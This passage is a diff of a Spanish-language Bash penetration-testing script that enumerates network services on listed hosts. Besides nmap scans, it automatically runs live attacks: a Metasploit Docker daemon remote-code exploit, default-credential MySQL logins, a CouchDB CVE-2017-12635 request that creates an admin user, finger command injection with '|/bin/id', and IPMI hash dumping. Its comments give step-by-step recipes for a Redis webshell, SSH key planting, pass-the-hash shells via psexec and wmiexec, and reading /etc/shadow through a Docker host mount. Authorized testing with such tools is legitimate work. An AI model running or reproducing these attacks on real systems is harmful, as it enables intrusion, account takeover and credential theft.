+		grep "|" logs/enumeracion/"$ip"_hadoop_secondary.txt > .enumeracion/"$ip"_hadoop_secondary.txt		
+	done
+	insert_data
+fi
+
+
+
+if [ -f servicios/hadoop-tasktracker.txt ]
+	then
+	echo -e "$OKBLUE #################### hadoop-tasktracker (`wc -l servicios/hadoop-tasktracker.txt`) ######################$RESET"	    
+	for line in $(cat servicios/hadoop-tasktracker.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+ 		echo "nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_tasktracker.txt
+		nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_tasktracker.txt
+		grep "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt > .enumeracion/"$ip"_hadoop_tasktracker.txt		
+	done
+	insert_data
+fi
+
+
 if [ -f servicios/memcached.txt ]
 	then
 	echo -e "$OKBLUE #################### memcached (`wc -l servicios/memcached.txt`) ######################$RESET"	    
 	for line in $(cat servicios/memcached.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
-		memcstat --servers=$ip > logs/vulnerabilidades/"$ip"_"$port"_memcached.txt
-		memccat --servers=$ip `memcdump --servers=$ip` > .vulnerabilidades/"$ip"_"$port"_memcached.txt
+		echo "memcstat --servers=$ip" > logs/vulnerabilidades/"$ip"_"memcached"_memcached.txt
+		memcstat --servers=$ip >> logs/vulnerabilidades/"$ip"_"memcached"_memcached.txt
+		memccat --servers=$ip `memcdump --servers=$ip` > .vulnerabilidades/"$ip"_"memcached"_memcached.txt
+		php -r "\$c = new Memcached(); \$c->addServer('$ip', $port); var_dump( \$c->getAllKeys() );" > logs/vulnerabilidades/"$ip"_"memcached"_dump.txt
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/squid.txt ]
+	then
+	echo -e "$OKBLUE #################### squid (`wc -l servicios/squid.txt`) ######################$RESET"	    
+	for line in $(cat servicios/squid.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo "curl --proxy http://$ip:3128 http://$ip" > logs/vulnerabilidades/"$ip"_"squid"_auth.txt
+		curl --proxy http://$ip:$port http://$ip >> logs/vulnerabilidades/"$ip"_"squid"_auth.txt
+
+		egrep -iq "DENIED" logs/vulnerabilidades/"$ip"_"squid"_auth.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t$OKRED[!] No autenticacion requerida \n $RESET"
+			echo "No autenticacion requerida" > .vulnerabilidades/"$ip"_"squid"_auth.txt			
+		fi
+		
+	done
+
+	insert_data
+fi
+
+if [ -f servicios/docker.txt ]
+	then
+	echo -e "$OKBLUE #################### docker (`wc -l servicios/docker.txt`) ######################$RESET"	    
+	for line in $(cat servicios/docker.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo "curl -s http://$ip:$port/version | jq" > logs/enumeracion/"$ip"_"$port"_version.txt
+		curl -s http://$ip:$port/version | jq >> logs/enumeracion/"$ip"_"$port"_version.txt
+
+		echo "msfconsole -x use exploit/linux/http/docker_daemon_tcp;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_RCE.txt 2>/dev/null
+		msfconsole -x "use exploit/linux/http/docker_daemon_tcp;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_"$port"_RCE.txt 2>/dev/null
+		#docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+		#cat /mnt/etc/shadow
+		
+	done
+
+	insert_data
+fi
+
+
+if [ -f servicios/proxy.txt ]
+	then
+	echo -e "$OKBLUE #################### proxy (`wc -l servicios/proxy.txt`) ######################$RESET"	    
+	for line in $(cat servicios/proxy.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		echo "nmap -Pn --script=socks-auth-info -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
+		nmap -Pn --script=socks-auth-info -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt > .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 
+
+		echo "nmap -Pn --script=socks-brute -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
+		nmap -Pn --script=socks-brute -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 
+
+		# echo socks5 10.10.10.10 1080 username password > nano /etc/proxychains4.conf
+
 	done
 
 	insert_data
@@ -780,19 +1976,18 @@ if [ -f servicios/mysql.txt ]
 	for line in $(cat servicios/mysql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
-		echo "nmap -Pn  --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt 2>/dev/null
-		nmap -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt
+		echo "nmap -Pn  --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip" > logs/vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt 2>/dev/null
+		nmap -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt
 
-		medusa -e n -u root -p root -h $ip -M mysql >>  logs/cracking/"$ip"_3306_defaultPassword.txt
-		medusa -u root -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_3306_defaultPassword.txt		
-		medusa -e n -u dbuser -p 123 -h $ip -M mysql >>  logs/cracking/"$ip"_3306_defaultPassword.txt
-		medusa -e n -u mysql -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_3306_defaultPassword.txt
-		medusa -e n -u admin -p admin -h $ip -M mysql >>  logs/cracking/"$ip"_3306_defaultPassword.txt
+		echo "medusa -e n -u root -p root -h $ip -M mysql" >  logs/cracking/"$ip"_mysql_defaultPassword.txt
+		medusa -e n -u root -p root -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
+		medusa -u root -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt		
+		medusa -e n -u dbuser -p 123 -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
+		medusa -e n -u mysql -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
+		medusa -e n -u admin -p admin -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
 
-	
-
-		grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_defaultPassword.txt | tee -a .vulnerabilidades/"$ip"_3306_defaultPassword.txt
+		grep --color=never -i SUCCESS logs/cracking/"$ip"_mysql_defaultPassword.txt | tee -a .vulnerabilidades/"$ip"_mysql_defaultPassword.txt
 
 	done
 
@@ -808,6 +2003,14 @@ if [ -f servicios/smtp.txt ]
 			port=`echo $line | cut -f2 -d":"`
 			
 			echo -e "[+] Escaneando $ip:$port"
+
+			if [ ! -z "$DOMINIO_EXTERNO" ]; then
+				DOMINIO=$DOMINIO_EXTERNO
+			fi
+
+			if [ ! -z "$DOMINIO_INTERNO" ]; then
+				DOMINIO=$DOMINIO_INTERNO
+			fi
 			
 			########## Banner #######
 			echo -e "\t[+] Obteniendo banner"
@@ -880,7 +2083,7 @@ if [ -f servicios/smtp.txt ]
 				#if [ $internet == "s" ]; then 
 					hackWeb.pl -t $ip -p $port -m openrelay -c "sistemas@$DOMINIO" -s 0> logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
 				#else	
-					#open-relay.py $ip $port "sistemas@$DOMINIO" > logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
+					#open-relay.py $ip $port "sistemas@$DOMINIO_EXTERNO" > logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
 				#fi							
 			fi	
 			
@@ -998,6 +2201,19 @@ then
 	
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c 'echo smbclient --list //_target_/ -U > logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null' --silent
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c 'smbclient --list //_target_/ -U " "%" " >> logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null' --silent
+
+	#get shell
+	# psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	# psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+	# wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	# wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+	# smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	# smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+	# atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
+	# atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 	
 fi
 
@@ -1019,7 +2235,7 @@ then
 		grep "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms06025.txt 
 		grep "|" logs/vulnerabilidades/"$ip"_445_cve20177494.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_cve201774941.txt 
 		grep "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_445_ms09050.txt
-		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt  > .vulnerabilidades/"$ip"_445_nullsession.txt 
+		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt | grep -v "Enter WORKGROUP" > .vulnerabilidades/"$ip"_445_nullsession.txt 
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
 		egrep --color=never "Disk" logs/vulnerabilidades/"$ip"_445_compartidoSMBClient.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMBClient.txt		
@@ -1103,26 +2319,33 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip"
-		echo -e "\t[+] Probando usuario anonimo"		
-		echo "ipmitool -I lanplus -H $ip -U '' -P '' user list" >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
-		ipmitool -I lanplus -H $ip -U '' -P '' user list >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
-		grep -i "ADMIN" logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt > .vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 	
-		
-		echo -e "\t[+] Probando vulnerabilidad cipher-zero"
-		echo "nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
-		nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
-		
-		#exploit
-		#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
-		#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user set password 1 123456 
-		
-		echo -e "\t[+] Probando si se puede extraer hashes"
-		msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;set CRACK_COMMON false;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null							   
-		egrep --color=never -i "Hash found" logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt  >> .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
-		egrep --color=never -i "Hash for user" logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt  >> .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
-		#hashcat -m 7300 out.hashcat -a 3 ?a?a?a?a
-				
+		msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_IPMIVersion.txt 2>/dev/null							   
+		grep "[+]" logs/enumeracion/"$ip"_"$port"_IPMIVersion.txt | grep "IPMI" | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .enumeracion/"$ip"_"$port"_IPMIVersion.txt
+
+		egrep -iq "+" .enumeracion/"$ip"_"$port"_IPMIVersion.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then						
+			echo -e "\t$OKRED[!] IPMI activo $RESET"			
+			echo -e "\t[+] Probando usuario anonimo"		
+			echo "ipmitool -I lanplus -H $ip -U '' -P '' user list" >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
+			ipmitool -I lanplus -H $ip -U '' -P '' user list >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
+			grep -i "ADMIN" logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt > .vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 	
+			
+			echo -e "\t[+] Probando vulnerabilidad cipher-zero"
+			echo "nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
+			nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
+			grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
+			
+			#exploit
+			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
+			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user set password 1 123456 
+			
+			echo -e "\t[+] Probando si se puede extraer hashes"
+			#msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;set CRACK_COMMON false;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null							   
+			ipmipwner.py --host $ip -oH logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null	
+			grep -i rakp logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt > .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
+			#./hashcat.bin "dddd:aaaaa" /media/sistemas/Passwords/Passwords/rockyou2021.txt
+		fi		
 	done
 	
 	#insert clean data	
@@ -1136,11 +2359,10 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"
-		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip"  > logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt 2>/dev/null 
-		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt 				
-	done
-	
+		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-databases,mongodb-info $ip"  > logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
+		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
+		grep "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_info.txt 				
+	done	
 	#insert clean data	
 	insert_data	
 fi
@@ -1153,9 +2375,13 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip:$port"
-		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases $ip" >> logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt 2>/dev/null
-		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_noSQLDatabases.txt
+		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases,couchdb-stats $ip" >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
+		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_info.txt
+
+		#CVE-2017-12635
+		curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}' $ip:$port/_users/org.couchdb.user:hacker -H "Content-Type:application/json" > logs/vulnerabilidades/"$ip"_"$port"_privEsc.txt
+
 	done
 	
 	#insert clean data	
@@ -1175,6 +2401,11 @@ then
 		echo "nmap -Pn -n $ip --script=x11-access.nse" > logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
 		nmap -Pn -n $ip --script=x11-access.nse >> logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 
+
+		#xdpyinfo -display <ip>:<display>
+		#xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
+
+		#use exploit/unix/x11/x11_keyboard_exec
 	done	
 	
 	#insert clean data	
@@ -1195,11 +2426,17 @@ then
 		echo "nmap -n -sT -p $port $ip --script=rpcinfo" > logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
 		nmap -Pn -n -p $port $ip --script=rpcinfo >> logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
 		grep "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_"$port"_NFSinfo.txt
+
+		rusers -l $ip > logs/enumeracion/"$ip"_"$port"_rusers.txt 2>/dev/null
+		egrep "console|tty" logs/enumeracion/"$ip"_"$port"_rusers.txt > .enumeracion/"$ip"_"$port"_rusers.txt
+
+		showmount $ip > logs/enumeracion/"$ip"_"$port"_showmount.txt 2>/dev/null
+		cat logs/enumeracion/"$ip"_"$port"_showmount.txt > .enumeracion/"$ip"_"$port"_showmount.txt 
 		
 	done	
 	# mount -t nfs 10.11.1.72:/home /mnt/compartido
 	# mount -o nolock 10.11.1.72:/home /mnt/compartido
-	#insert clean data	
+	# mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
 	insert_data	
 fi
 
@@ -1256,12 +2493,33 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"			
-		echo "nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_"$port"_redisInfo.txt 2>/dev/null
-		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_"$port"_redisInfo.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"$port"_redisInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/"$ip"_"$port"_redisInfo.txt						
+		echo "nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
+		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/"$ip"_redis_info.txt						
+		#A exploit for Redis(<=5.0.5) RCE redis-exploit.sh
 
-		redis-cli -h $ip config get '*' > logs/enumeracion/"$ip"_"$port"_redisConfig.txt 2>/dev/null
-		cat logs/enumeracion/"$ip"_"$port"_redisConfig.txt > .enumeracion/"$ip"_"$port"_redisConfig.txt
+		echo "redis-cli -h $ip config get '*'" > logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
+		redis-cli -h $ip config get '*' >> logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
+		cat logs/enumeracion/"$ip"_redis_config.txt > .enumeracion/"$ip"_redis_config.txt
+
+		echo "msfconsole -x use auxiliary/scanner/redis/redis_server;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_redis_endpoints.txt 2>/dev/null
+		msfconsole -x "use auxiliary/scanner/redis/redis_server;set RHOSTS $ip;exploit;exit" >> logs/enumeracion/"$ip"_redis_endpoints.txt 2>/dev/null
+		grep '\[+\]' logs/enumeracion/"$ip"_redis_endpoints.txt > .enumeracion/"$ip"_redis_endpoints.txt
+
+		#Webshell
+		# redis-cli -h 10.85.0.52
+		# config set dir /usr/share/nginx/html
+		# config set dbfilename redis.php
+		# set test "<?php phpinfo(); ?>"
+		# save
+
+		#SSH
+		#(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
+		#cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
+		# redis-cli -h 10.85.0.52
+		# config set dir /var/lib/redis/.ssh
+		# config set dbfilename "authorized_keys"
+		# save
 
 
 	done
@@ -1277,9 +2535,21 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Escaneando $ip:$port"
+
+		echo -e "[+] Nmap vulnerabilities"
 		echo "nmap -Pn -n -p $port --script rmi-vuln-classloader $ip" > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
 		nmap -Pn -n -p $port --script rmi-vuln-classloader $ip>> logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt
+
+		echo -e "[+] rmg vulnerabilities"
+		rmg.sh enum $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt
+		grep "+" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt > .vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt
+
+		echo -e "[+] rmg guess"
+		rmg.sh guess $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiGuess.txt
+		grep "+" logs/vulnerabilidades/"$ip"_"$port"_rmiGuess.txt > .vulnerabilidades/"$ip"_"$port"_rmiGuess.txt
+		
+
 		
 	done
 	
@@ -1349,8 +2619,14 @@ then
 		port=`echo $line | cut -f2 -d ":"`
 		rsync -av --list-only rsync://$ip:$port > logs/enumeracion/"$ip"_"$port"_rsyncList.txt 2>/dev/null
 		cat logs/enumeracion/"$ip"_"$port"_rsyncList.txt > .enumeracion/"$ip"_"$port"_rsyncList.txt				
+
 	 	nmap -p $port --script rsync-list-modules $ip > logs/enumeracion/"$ip"_"$port"_rsync.txt 2>/dev/null
 		grep '|' logs/enumeracion/"$ip"_"$port"_rsync.txt > .enumeracion/"$ip"_"$port"_rsync.txt
+
+		#rsync -av rsync://10.10.10.200/conf_backups files
+		#encfs2john files/ > encfs6.xml.john2
+		#john --wordlist=/usr/share/wordlists/rockyou.txt --progress-every=3 --pot=s3cwalk.pot encfs6.xml.john
+		#encfsctl export files decrypt
 		 
  	done <servicios/rsync.txt
 		
@@ -1467,9 +2743,17 @@ then
 		ip=`echo $line | cut -f1 -d":"`		
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Escaneando $ip:$port"		
-		finger @$ip > .vulnerabilidades/"$ip"_79_usuariosSistema.txt &
+		finger @$ip > logs/vulnerabilidades/"$ip"_79_usuariosSistema.txt 
+		cp logs/vulnerabilidades/"$ip"_79_usuariosSistema.txt  .vulnerabilidades/"$ip"_79_usuariosSistema.txt 
+
+		#Fast Enum #
+		for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; finger "$q@$ip"; echo -e "\n";done > logs/vulnerabilidades/"$ip"_79_fastEnum.txt
+		cp logs/vulnerabilidades/"$ip"_79_fastEnum.txt .vulnerabilidades/"$ip"_79_fastEnum.txt
 		sleep 1
 					# done true				        	        				
+	    #finger "|/bin/id@10.0.0.3"
+		finger-user-enum.pl -U $common_user_list -t $ip > logs/vulnerabilidades/"$ip"_79_enumBrute.txt
+		grep ssh logs/vulnerabilidades/"$ip"_79_enumBrute.txt > .vulnerabilidades/"$ip"_79_enumBrute.txt
 	done < servicios/finger.txt	
 fi
 
@@ -1514,9 +2798,13 @@ then
 		egrep --color=never -i "None" logs/vulnerabilidades/"$ip"_"$port"_VNCnopass.txt  > .vulnerabilidades/"$ip"_"$port"_VNCnopass.txt 
 		
 		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
-		echo "nmap -n -sT -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/"$ip"_"$port"_realvncBypass.txt 2>/dev/null
-		nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/"$ip"_"$port"_realvncBypass.txt 2>/dev/null
+		echo "nmap -n -sT -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip" > logs/vulnerabilidades/"$ip"_"$port"_realvncBypass.txt 2>/dev/null
+		nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/vulnerabilidades/"$ip"_"$port"_realvncBypass.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_realvncBypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .vulnerabilidades/"$ip"_"$port"_realvncBypass.txt
+
+		#vncpwd <vnc password file>
+
+		
 	done
 	
 	#insert clean data	
@@ -1534,68 +2822,17 @@ then
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"	
 		echo -e "\t[+] Obteniendo información de MS-SQL"
-		echo "nmap -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
-		nmap -Pn -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
+		echo "nmap -Pn -n -sV -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
+		nmap -Pn -n -sV -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
